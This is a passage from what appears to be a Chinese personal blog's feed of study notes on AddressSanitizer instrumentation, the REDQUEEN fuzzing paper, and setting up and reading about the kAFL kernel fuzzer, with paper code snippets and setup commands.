href="#Evaluation" class="headerlink" title="Evaluation"></a>Evaluation</h2><p>讲解asan的性能方面的表现，这章直接pass</p><h2 id="Future-Work"><a href="#Future-Work" class="headerlink" title="Future Work"></a>Future Work</h2><p>此章节讲解后续能改进asan的一些办法</p><h3 id="Compile-time-Optimizations"><a href="#Compile-time-Optimizations" class="headerlink" title="Compile-time Optimizations"></a>Compile-time Optimizations</h3><p>主要是通过减少不必要的内存访问来提升性能</p><p>针对两次的内存访问情形进行优化</p><p>1.只需要检测第一次</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-comment">*a = ...</span><br><span class="hljs-function"><span class="hljs-title">if</span></span> (...)<br>*a = ...<br></code></pre></td></tr></table></figure><p>2.针对第二次访问检测</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">if</span></span> (...)<br>*a = ...<br><span class="hljs-comment">*a = ...</span><br></code></pre></td></tr></table></figure><p>这种优化可能放弃了在实际加载或存储发生之前报告错误的特性。</p><p>3.针对数组只检测第一个和最后一个元素</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">for (int i = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; n; i++)</span><br>a[i] = ...<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>这种检测方案已经在memcpy memset类的函数中使用，当n过大时可能会忽略一些错误情况。</p><p>4.针对相邻内存，合并两次检测</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-keyword">int</span> a, b; &#125; x; ...<br>x.a = ...;<br>x.b = ...;<br></code></pre></td></tr></table></figure><p>5.针对确定安全的访问不必要进行检测,如固定范围的数组迭代</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">int x[<span class="hljs-number">100</span>]<span class="hljs-comment">;</span><br>for (int i = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 100; i++)</span><br>x[i] = ...<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>6.不检测全局变量的标量</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">int</span> <span class="hljs-keyword">glob</span>;<br><span class="hljs-keyword">int</span> get_glob() &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">glob</span>; &#125;<br></code></pre></td></tr></table></figure><h3 id="Handling-Libraries"><a href="#Handling-Libraries" class="headerlink" title="Handling Libraries"></a>Handling Libraries</h3><p>目前的asan因为基于插桩，所以需要开源的才能支持，系统库由于预编译不能直接处理但是可以处理一些库函数如memset</p><p>针对开源库采用asan进行编译</p><p>针对闭源库，结合DynamoRIO类的插桩工具，在部分地方可能会有实现的困难，如栈上的redzone。</p><h3 id="Hardware-Support"><a href="#Hardware-Support" class="headerlink" title="Hardware Support"></a>Hardware Support</h3><p>asan的开销可以在大部分情况下使用，但是针对某些情况还是存在受限。此时有硬件支持会改善很多，如新增硬件指令<code>“check4 Addr</code>该指令应该等效于如下操作</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lisp">ShadowAddr = (<span class="hljs-name">Addr</span> &gt;&gt; Scale) + Offset<span class="hljs-comment">;</span><br>k = *ShadowAddr<span class="hljs-comment">;</span><br>if (<span class="hljs-name">k</span> != <span class="hljs-number">0</span> <span class="hljs-symbol">&amp;&amp;</span> ((<span class="hljs-name">Addr</span> &amp; <span class="hljs-number">7</span>) + N &gt; k)<br>GenerateException()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><code>Offset</code> 和 <code>Scale</code> 的值可以存储在特殊的寄存器中，并在应用程序启动时设置。</p><p>通过引入新指令可以显著减小二进制大小，且通过减少指令缓存（icache）压力、组合简单的算术操作以及实现更好的分支预测，这样的指令可以提高性能。</p><p>引入的指令还有一定的灵活性，默认情况下，<code>checkN</code> 指令可以是无操作（no-op），只有在设置了特殊的 CPU 标志时才启用。这样可以选择性地测试某些执行，甚至是在长时间运行的进程的一部分执行时间内进行测试。</p><h2 id="EXAMPLE"><a href="#EXAMPLE" class="headerlink" title="EXAMPLE"></a>EXAMPLE</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">void</span> <span class="hljs-function"><span class="hljs-title">foo</span>(<span class="hljs-params">T *a</span>)</span> &#123;<br>*a = <span class="hljs-number">0x1234</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>clang -O2 -faddress-sanitizer a.c -c -DT=long</code>进行编译</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">push</span> %rax<br>mov %rdi,%rax<br>shr $0x3,%rax<br>mov $0x10000000000<span class="hljs-number">0</span>,%rcx<br><span class="hljs-keyword">or</span> %rax,%rcx<br>cmpb $0<span class="hljs-keyword">x</span><span class="hljs-number">0</span>,(%rcx) <span class="hljs-comment"># Compare Shadow with 0</span><br>jne <span class="hljs-number">23</span> &lt;foo+<span class="hljs-number">0x23</span>&gt; <span class="hljs-comment"># To Error</span><br>movq $0x1234,(%rdi) <span class="hljs-comment"># Original store</span><br><span class="hljs-keyword">pop</span> %rax<br>retq<br>callq __asan_report_store8 <span class="hljs-comment"># Error</span><br></code></pre></td></tr></table></figure><p>汇编如上，首先计算shadow byte地址</p><p><code>ShadowAddr = (Addr &gt;&gt; 3) + Offset;</code></p><p>接着比较是否为0即<code>cmpb $0x0,(%rcx)</code></p><p>不相等则跳转报错，否则进行mov操作<code>movq $0x1234,(%rdi) # Original store</code></p><p>上述是8字节的案例，下面是四字节的</p><p><code>clang -O2 -faddress-sanitizer a.c -c -DT=int</code></p><p>编译后汇编如下</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">push</span> %rax<br>mov %rdi,%rax<br>shr $0x3,%rax<br>mov $0x10000000000<span class="hljs-number">0</span>,%rcx<br><span class="hljs-keyword">or</span> %rax,%rcx<br>mov (%rcx),%al <span class="hljs-comment"># Get Shadow</span><br>test %al,%al<br>je <span class="hljs-number">27</span> &lt;foo+<span class="hljs-number">0x27</span>&gt; <span class="hljs-comment"># To original store</span><br>mov %edi,%ecx <span class="hljs-comment"># Slow path</span><br><span class="hljs-keyword">and</span> $0x7,%ecx <span class="hljs-comment"># Slow path</span><br>add $0x3,%ecx <span class="hljs-comment"># Slow path</span><br>cmp %al,%cl<br>jge <span class="hljs-number">2</span>f &lt;foo+<span class="hljs-number">0x2f</span>&gt; <span class="hljs-comment"># To Error</span><br>movl $0x1234,(%rdi) <span class="hljs-comment"># Original store</span><br><span class="hljs-keyword">pop</span> %rax<br>retq<br>callq __asan_report_store4 <span class="hljs-comment"># Error</span><br></code></pre></td></tr></table></figure><p>同上，只不过多了个<code>((Addr &amp; 7) + AccessSize &gt; k)</code>判断操作。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>论文阅读笔记</title>
    <link href="/2022/10/24/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/10/24/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>总结近阶段学习情况</p><a id="more"></a><h1 id="REDQUEEN"><a href="#REDQUEEN" class="headerlink" title="REDQUEEN"></a>REDQUEEN</h1><p>本文主要是提出了一种方法，用于解决类似魔术字节还有校验值比较的问题。使用的方法是输入到状态的对应，类似一个轻量级的污点追踪，为了解决前者使用了hook，不仅仅是比较指令还有函数调用(涉及内存和字符串比较)lea和减法相关的指令，解决后续问题主要采用了指令集的patch，等到无法增加代码覆盖率时再反推，判断是否可以修复这些patch从而解决一系列校验值比较问题。</p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>提出当今fuzz的缺陷，遇到checksum或者是magic num时bypass校验的效率不是很高。对于此类校验通常会去使用符号执行或者污点追踪引擎，但是这类工具通常会需要借助要源码或是指定操作系统，可移植性不好。</p><p>鉴于此，本文提出一种替代方案，称为redqueen。</p><h2 id="INTRODUCTION"><a href="#INTRODUCTION" class="headerlink" title="INTRODUCTION"></a>INTRODUCTION</h2><p>FUZZ近些年在学术界和工业界都取得了不错的影响力。这是目前测试程序安全性的一种常用手段。为了确保在实践中使用fuzz，通常需要极少的前置条件。但这与效率冲突。为了提高效率一般都需要一个不错的种子输入或者是需要一个格式生成器来帮助fuzzer学习输入的格式应该是什么样的。给予反馈的fuzzer就是如此，吧触发新状态的输入保存。以产生更多的测试用例。</p><h3 id="常见的fuzz障碍"><a href="#常见的fuzz障碍" class="headerlink" title="常见的fuzz障碍"></a>常见的fuzz障碍</h3><p>最常见的就是checksum和magicnum。忽略掉随机生成正确的种子的情况，基于反馈的fuzz基本不会产出正确的input来覆盖更多的代码，</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* magic number example */</span><br><span class="hljs-keyword">if</span>( u64 ( input ) == u64 (<span class="hljs-string">&quot; MAGICHDR &quot;</span>))<br>bug (<span class="hljs-number">1</span>) ;<br><span class="hljs-comment">/* nested checksum example */</span><br><span class="hljs-keyword">if</span>( u64 ( input ) == sum ( input +<span class="hljs-number">8</span> , len <span class="hljs-number">-8</span>) )<br><span class="hljs-keyword">if</span>( u64 ( input +<span class="hljs-number">8</span>) == sum ( input +<span class="hljs-number">16</span> , len <span class="hljs-number">-16</span>) )<br><span class="hljs-keyword">if</span>( input [<span class="hljs-number">16</span>]== ’R ’ &amp;&amp; input [<span class="hljs-number">17</span>]== ’Q ’)<br>bug (<span class="hljs-number">2</span>) ;<br><br></code></pre></td></tr></table></figure><p>过去人们更倾向于使用高级的代码分析技术来解决此类问题，如污点追踪或是符号执行。（ANGORA和T-FUZZ）这类方法通常需要对环境有一个精确的描述如lib call的行为底层操作系统的行为以及平台所使用的指令集。因此很难再使用复杂指令集或是不常见的库和操作系统上使用。这类方法违背了afl设计的初衷。AFL的成功很大程度上是因为其对程序的假设很少，基于此我们提出了一种新型的fuzz方法，该类方法可用于任意目标来增加代码覆盖率。</p><h3 id="输入到状态对应"><a href="#输入到状态对应" class="headerlink" title="输入到状态对应"></a>输入到状态对应</h3><p>这边讲了具体的实现，其实实现的方法很巧妙。。。主要原理是观察比较指令cmp这种。一般程序对输入都不会经过处理直接操作，比如与一些魔术字节相比较，字符串直接以小端序的形式存储在寄存器中。redqueen将其标记为污点，从而实现一个轻量级的污点追踪。</p><h3 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h3><p>1.引入了输入到状态对应的概念来帮助fuzz</p><p>2.演示了该种概念的效果，可用于替代符号执行和污点追踪生成的种子可以覆盖更多的代码</p><p>3.该类方法被集成在REDQUEEN中</p><h2 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a>相关工作</h2><p>介绍几类不同的fuzz的原理</p><p>1.符号执行</p><p>2.污点追踪</p><p>3.基于补丁</p><p>4.基于二进制文件</p><p>5.afl家族</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span>( u64 ( input ) == u64 (<span class="hljs-string">&quot; MAGICHDR &quot;</span>) )<br>bug (<span class="hljs-number">1</span>) ;<br></code></pre></td></tr></table></figure><p>面对如上魔术字节情况。普通的afl变异很难触发bug。目前能解决如上魔术字节问题的fuzz不是需要源码就是有很大的性能开销。</p><p>reqqueen是基于输入到状态对应的一种轻量级方法。以全自动的方式处理魔术字节。考虑到程序状态中的值通常直接对应于输入的部分这一事实。每次遇到新路径时，都会对比较指令进行跟踪，如果遇到不同参数的比较，通常会提取两个参数进行一个自定义的变异<code>&lt;pattern 7→ repl&gt;</code>.如下表所示。</p><table><thead><tr><th>C-Code</th><th align="center">u64(input) == u64(“MAGICHDR”)</th></tr></thead><tbody><tr><td>Input</td><td align="center">“TestSeedInput”</td></tr><tr><td>Observed (ASCII)</td><td align="center">“deeStesT” == “RDHCIGAM”</td></tr><tr><td>Variations for &lt; and &gt; comparisons</td><td align="center">“deeStesT” →“RDHCIGAL”, “deeStesT” →“RDHCIGAN”</td></tr><tr><td>Mutations after little-endian encoding</td><td align="center">&lt;“TestSeed” 7→ “MAGICHDR”&gt; , &lt;“TestSeed” 7→ “LAGICHDR”&gt;, &lt;“TestSeed” 7→ “NAGICHDR”&gt;</td></tr></tbody></table><p>当对新输入进行模糊测试时，会挂钩所有比较指令并提取参数，此外还会挂钩所有的调用函数，因为部分函数也会实现一些比较功能如<code>strcmp</code>.</p><p>步骤见上表:</p><p>1.将<code>TestSeedInput</code>看做是input，比较指令会比较八个字节，字符串以小端序形式存储在寄存器中。所以看到的是“deeStesT” == “RDHCIGAM”</p><p>2.因为在运行时我们无法判断此次cmp是判断大于还是小于或是等于，所以还会对比较的值做一些变化，即加一和减一的操作(见表中的RDHCIGAL和RDHCIGAN)。正因此，redqueen还能帮助发现offbyone的bug。</p><p>3.当然需要考虑到大多数情况下输入都会经过一些处理如加密然后再进行比较，为了应对这类的操作，redqueen准备了不同的编码应用于变异，最常见就是就字节顺序转换。</p><p><img src="image-20221022153817005.png" alt="目前支持的一些变换操作"></p><p>4.应用。redqueen使用的是部分变异。如输入“TestSeedInput”时只有比较的前八个字节“TestSeed”才会被变异，新生成的testcase就是“MAGICHDRInput”</p><p>5.标记。用于解决候选input数量庞大的问题通常会采用一种“colored”copy，即随机。如input为“ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ”时会得到ZZZZZZZZ 7→ MAGICHDR。这个变异可适用于24个不同的地方，为了解决这种问题，redqueen会在不改变代码覆盖率的情况下对输入进行一个变异，比如将其变异为“QYISLKFYDBYYSYWSIBSXEAXOKHNRUCYU”，这样得到的就是QYISLKFY 7→ MAGICHDR，仅有一处适用，候选的输入就降为了0。</p><p>6.字符串与内存。除了上述的一些比较，程序中还会出现一些通过调用函数来比较的方法，这时redqueen会hook函数调用，如果函数至少接受俩个参数，会提取其指向的前128个字节并将其视为整数。针对memcpy和strcmp类的函数还会采取不同的措施。</p><p>7.输入字典。</p><p>上述的都是针对魔术字节的一些处理方法，至于针对校验和。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span>( u64 ( input ) == sum ( input +<span class="hljs-number">8</span> , len <span class="hljs-number">-8</span>) )<br><span class="hljs-keyword">if</span>( u64 ( input +<span class="hljs-number">8</span>) == sum ( input +<span class="hljs-number">16</span> , len <span class="hljs-number">-16</span>) )<br><span class="hljs-keyword">if</span>( input [<span class="hljs-number">16</span>]== ’R’ &amp;&amp; input [<span class="hljs-number">17</span>]== ’Q’)<br>bug (<span class="hljs-number">2</span>) ;<br></code></pre></td></tr></table></figure><p>目前的很多方法像FLAYER T-FUZZ等。都是直接删除检查，如果有一些有趣的行为发生才会通过符号执行来想办法绕过检查。</p><p>这一部分可能有点难看懂，其实还是一种比较巧妙的方法，首先redqueen会识别到比较指令然后对其进行patch，比如patch成cmp ax,ax然后再次运行，如果产生了新的路径就会进入validation mode，在这个状态下会重复上述动作，如果没有新的状态就会取消上述patch。接着用类似magic bytes的方法，逆向着解决，如上图会先解决input [16]== ’R’ &amp;&amp; input [17]== ’Q’接着解决u64 ( input +8)最后才是u64 ( input)</p><h2 id="实施细节"><a href="#实施细节" class="headerlink" title="实施细节"></a>实施细节</h2><p>基于KAFL，用相同的方式来获取代码覆盖率。此外会利用KVM-PT和QEMU-PT提供的VMI来插入断点来监视运行时的寄存器的值。</p><h3 id="hook-比较指令"><a href="#hook-比较指令" class="headerlink" title="hook 比较指令"></a>hook 比较指令</h3><p>每次反汇编程序遇到一个类似比较的指令时都会保存其地址然后在下一次redqueen分析阶段就会就会进行hook。当进入分析时，断点被触发，参数被提取并保存到缓冲区中。值得注意的是，redqueen不仅hook cmp指令还会hook call指令和减法指令。前者是为了识别出内存和字符串比较，后者是编译器实现cmp的另一种写法，一般会用在switch中。也有时候会以另一种形式呈现比如lea或者是add一个复数。如果call指令的前俩个参数是一个正常的指针，redqueen就问认为这是个潜在的比较函数然后会吧参数指向的前128个字节dump出来。</p><h3 id="着色标记"><a href="#着色标记" class="headerlink" title="着色标记"></a>着色标记</h3><p>即在不改变程序执行路径（AFL bitmap）的情况下尽可能用随机值替换字符串。这增加了输入的熵，减少了候选的input数量可以很大程度的增加效率。</p><h3 id="patch-指令"><a href="#patch-指令" class="headerlink" title="patch 指令"></a>patch 指令</h3><p>候选的哈希比较指令列表被计算出后就会对其进行patch，一般都会使用必真的比较指令如cmp al,al，其余的会用nop填充。当patch时，所新增的bitmap不会被添加到队列中。</p><h3 id="输入验证和修复"><a href="#输入验证和修复" class="headerlink" title="输入验证和修复"></a>输入验证和修复</h3><p>算法如图</p><p><img src="image-20221023174503083.png" alt="算法"></p><p>接下去就是讲解redqueen是否能解决这一系列问题和与其他工具比较效率咋样，这边就不多写了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>近期学习记录</title>
    <link href="/2022/10/09/%E8%BF%91%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/10/09/%E8%BF%91%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>总结近阶段学习情况</p><a id="more"></a><h1 id="关于kafl"><a href="#关于kafl" class="headerlink" title="关于kafl"></a>关于kafl</h1><p>像kafl这种基于反馈的fuzz，还是很大程度上依赖人工逆向，只能作为一个辅助工具去使用。用于帮助漏洞挖掘。</p><p>如图，某功能点，fuzz一天下来0 crash。</p><p><img src="image-20221009000812280.png" alt="image-20221009000812280"></p><p>后续花了6天时间逆向，重新编写testcase</p><p><img src="image-20221009000851619.png" alt="image-20221009000851619"></p><p>18小时5 crash    //虽然是个bsod</p><p>这也证明了不能完全依赖于kafl，人工逆向+合适的攻击面+合适的testcase+kafl，效率往往会更好。</p><p>kafl也有一定的局限性，示例代码仅仅是通过hook kebugcheck来判断漏洞</p><h1 id="paper阅读"><a href="#paper阅读" class="headerlink" title="paper阅读"></a>paper阅读</h1><p>paper阅读这块感觉自我做的还是不太行，有很大的提升空间。</p><p>往往会遇到很多新的知识面，一开始的做法是遇到一个新的就去百度就去学，学差不多了就回头继续看paper，但是那时已经忘了前面讲的是啥了。</p><p>现阶段，多次阅读，每过一段时间就重新看一下，每次阅读都会有新的感受。</p><p>阅读配合着使用，实践才是检验整理的唯一标准。</p><h1 id="后续规划"><a href="#后续规划" class="headerlink" title="后续规划"></a>后续规划</h1><p>1.paper阅读，量得上去</p><p>2.逆向+testcase编写</p><p>工作没多少时间搞研究，只能私下搞搞了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>kafl使用</title>
    <link href="/2022/09/13/kafl%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/13/kafl%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>每周学习，用于督促下班后好好把握自由时间来学习。</p><a id="more"></a><p>安装教程见上文</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p><a href="https://github.com/Kharos102/kafl.targets">https://github.com/Kharos102/kafl.targets</a></p><p>(这个链接是大佬总结的各种操作系统的使用demo)</p><p><a href="https://github.com/IntelLabs/kafl.targets/tree/master/linux-kernel">https://github.com/IntelLabs/kafl.targets/tree/master/linux-kernel</a></p><p>(官方的linuxkernel教程)</p><p>先按照教程试了下linux-kernel的没啥问题</p><p>遇到的一些坑讲一下</p><p><img src="image-20220913003740971.png" alt="image-20220913003740971"></p><p>VMX_PT is not loaded!</p><p>这种情况重启电脑进advance setting，选那个kafl的kernel</p><p>//当时在bios里找了半天，明明vmx打开了。以为pt是另外一个单独功能整半天没找着</p><p><img src="image-20220913003923428.png" alt="image-20220913003923428"></p><p>链接里的readme也特别提到了这个。</p><p>其余的按照教程走就行了</p><p><img src="image-20220913004037421.png" alt="image-20220913004037421"></p><p>接下去是windows使用</p><p>demo里给了教程，一个windows的driver自己编译后设置开机自启，我这边windows先打开了测试模式防止签名验证</p><p><code>bcdedit -set &#123;default&#125; TESTSIGNING on</code></p><p>还有就是fuzzer的test case在Ubuntu里编译一下，正常情况下会报错，命令行参数除了<code>-lntdll</code>还要加个<code>-lpsapi</code>.</p><p>//后续，建议大家看intel官方的<a href="https://github.com/IntelLabs/kafl.targets%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%B0%B1%E4%B8%8D%E9%9C%80%E8%A6%81%E9%82%A3%E4%B9%88%E9%BA%BB%E7%83%A6%E4%BA%86%E3%80%82">https://github.com/IntelLabs/kafl.targets，这个就不需要那么麻烦了。</a></p><p>接下去同样吧testcase设置开机自启然后吧镜像转换成qcow2格式。</p><p>这边建议虚拟机在安装前设置单个vmdk文件，省的一堆事，如果按照默认分为多个也没问题，自己克隆出来状态然后</p><p><code>vmware-vdiskmanager.exe -r &quot;G:\win10\windows-10-cl1.vmdk&quot; -t 0 G:\fuck.vmdk</code></p><p>接着跑就完事了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>kafl paper阅读</title>
    <link href="/2022/09/04/kafl-paper%E9%98%85%E8%AF%BB/"/>
    <url>/2022/09/04/kafl-paper%E9%98%85%E8%AF%BB/</url>
    
    <content type="html"><![CDATA[<p>每周学习，用于督促下班后好好把握自由时间来学习。</p><a id="more"></a><h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>介绍了当下fuzz的重要性，基于反馈的fuzzer可以发现很多安全问题。但是针对kernel当今没有很好的解决方案，然后作者解释原因，如kernel crash了整个系统重启，fuzzer也会没。最后介绍kafl，基于硬件特性如hypervisor和pt从而使得fuzzer和操作系统隔离开来。成功挖到许多漏洞。</p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>随着各种高大上的保护出现，常见的漏洞越来越难利用，但是内核态的防护还是不多，而且很多复杂防护会影响操作系统运行效率导致没有上。导致关注内核的人越来越多。</p><p>很长一段时间来fuzz都是一种增加软件安全性的好策略。随着afl的公开，业界出现了越来越多的smart fuzz，基于input的反馈来“学习”，从而一步步推出数据格式，增大代码覆盖率。但是afl是面向用户态的缺少内核态支持，内核态复杂很多会遇到很多困难。</p><p>本文的kafl将退出一种全新的技术来允许反馈式fuzz运用于所有基于x86-64的内核。并具有很好的可移植性。</p><h1 id="技术背景"><a href="#技术背景" class="headerlink" title="技术背景"></a>技术背景</h1><p>利用了一些硬件特性，需要cpu支持，本节主要介绍一些硬件的特性。</p><h2 id="x86-64-Virtual-Memory-Layouts"><a href="#x86-64-Virtual-Memory-Layouts" class="headerlink" title="x86-64 Virtual Memory Layouts"></a>x86-64 Virtual Memory Layouts</h2><p>用户态内核态的虚拟地址布局，内核态每个进程共享，一个物理地址映射到多个虚拟地址</p><h2 id="Intel-VT-x"><a href="#Intel-VT-x" class="headerlink" title="Intel VT-x"></a>Intel VT-x</h2><p>kafl内核层fuzz基于硬件虚拟化技术。</p><p>三种不同的cpu，物理cpu，逻辑cpu，虚拟cpu。</p><p>物理cpu是真实的cpu，大部分现代cpu都实现了超线程技术，用于在单核上运行多线程。所以就出现了逻辑cpu，每个核心都有几个逻辑处理器</p><p><img src="image-20220904182308909.png" alt="image-20220904182308909"></p><p>如i9 10900k，就是10核心，20逻辑处理器。</p><p>每个核心俩个逻辑处理器在交错处理时效率会很大，如一个逻辑处理器在进行计算另一个在进行等待。每个逻辑cpu对于操作系统来说都类似一整个cpu，所以就存在一种可能性，可以在单个逻辑cpu上构建多个虚拟机。</p><p>虚拟化模型分为俩部分，VMM和VM，VMM又被称作hypervisor或是host，这是一个高权限进程对整个物理cpu有完整操作权限，并给其虚拟化的客户端提供有限的物理资源。VM，也就是客户端，运行在VMM提供的虚拟化上下文环境中。</p><p>为了给硬件虚拟化提供支持，intel vt-x新增了俩种运行模式，VMX ON 和 VMX OFF, VMX OFF就是没有任何虚拟化操作，操作系统直接运行。打开后就在操作系统和物理cpu中新增了一层也就是hypervisor。</p><p>当运行在客户端模式下，遇到执行特权指令或获取特定设备资源时都会触发VM-Exit操作，此时把控制权交给hypervisor。这样成功实现牺牲小部分性能换取了虚拟化特性。将整个操作系统隔离开。为了更好的控制VM,VMM为每个虚拟cpu提供一个VMCS结构体，里面包含了一些特定信息如当前的状态和翻译vCPU的方法。</p><h2 id="Intel-Processor-Trace"><a href="#Intel-Processor-Trace" class="headerlink" title="Intel Processor Trace"></a>Intel Processor Trace</h2><p>用于跟踪地址，区别于其他tracer，受限较少。</p><h1 id="系统概览"><a href="#系统概览" class="headerlink" title="系统概览"></a>系统概览</h1><p><img src="image-20220905111402835.png" alt="image-20220905111402835"></p><p>整个系统分为三块：fuzzing逻辑，vm基础设置（QEMU-PT KVM-PT）,用户端。</p><p>整个fuzzing逻辑都在用户态运行，即kafl。VM设施包含了用户态的QEMU-PT和内核态的KVM-PT。这俩个设施相互通信从而使得intel pt得数据可以被kafl获取。guest和host通过hypercall来进行通信。host从而可以对guset内存进行读写并当请求被满足后继续跑VM。</p><p><img src="image-20220906103216438.png" alt="image-20220906103216438"></p><p>整个fuzz得流程如上，最开始时用户态loader通过hypercall <code>HC_SUBMIT_PANIC</code>来向QEMU-PT提交内核态异常处理函数地址BugCheck.QEMU-PT接着patch函数从而能更快的接收到函数的异常处理。而不是等待系统重启。</p><p>接着loader通过<code>HC_GET_PROGRAM</code>来启动agent。agent后续三步，先是提交当前进程的cr3，hypervisor会分解cr3寄存器并把其转交给QEMU-PT来过滤。最后agent通过<code>HC_SUBMIT_BUFFER</code>来通知host它期望输入的地址。到此fuzzer初始化完成接着fuzzer会建立起主循环。</p><p>在主循环中agent会通过HC_GET_INPUT来请求一个新输入。然后fuzzer会生成一个新的输入并把它传递给QEMU-PT。因为QEMU-PT对整个guest有完整权限，所以可以直接把input拷贝进agent指定的地址处。然后就会启动VM-Entry来今昔整个VM的运行，同时VM-Entry会启用PT。接着agent接受输入并与内核进行交互。当kernel被fuzz时，QEMU-PT会解码trace的数据并根据需求对bitmap进行更新。当整个交互完成时内核会基于agent反馈，然后agent通过<code>HC_FINISHED</code>来通知。接着QEMU-PT解码整个trace数据把结果传递给kafl做后续处理。agent可以在遇到下一个HC_GET_INPUT以启动下一个迭代前可以继续做处理。</p><h2 id="Fuzzing-Logic"><a href="#Fuzzing-Logic" class="headerlink" title="Fuzzing Logic"></a>Fuzzing Logic</h2><p>整个fuzzing logic由kafl的命令和控制俩部分组成。负责管理一系列输入与输入变异。在大多数情况下他的算法和afl的一样。类似于afl，我们用bitmap来存储基本块信息，根据QEMU-PT的接口获取bitmap来决定哪些输入会触发有趣的行为kafl与afl算法的最大区别就是对多进程和并行的优化，从而如果核心多，会很大程度的提高效率。</p><h2 id="User-Mode-Agent"><a href="#User-Mode-Agent" class="headerlink" title="User Mode Agent"></a>User Mode Agent</h2><p>需要一个agent在虚拟环境下通过hypercall与内核交互。</p><p>理论上只需要俩个组件</p><p>加载器：负责从hyperecall接口接收任意二进制数据，二进制数据就是用户态agent，同时加载器还会检测crash。</p><p>这几个组件可以让我们给VM传递任意二进制数据并在fuzz不同的组件时重用快照。</p><h2 id="Virtualization-Infrastructure"><a href="#Virtualization-Infrastructure" class="headerlink" title="Virtualization Infrastructure"></a>Virtualization Infrastructure</h2><p>整个fuzz逻辑通过QEMU-PT与KVM-PT交互来附加整个VMs。KVM-PT允许我们跟踪每个独立的虚拟cpu。</p><h2 id="Stateful-and-Non-Deterministic-Code"><a href="#Stateful-and-Non-Deterministic-Code" class="headerlink" title="Stateful and Non-Deterministic Code"></a>Stateful and Non-Deterministic 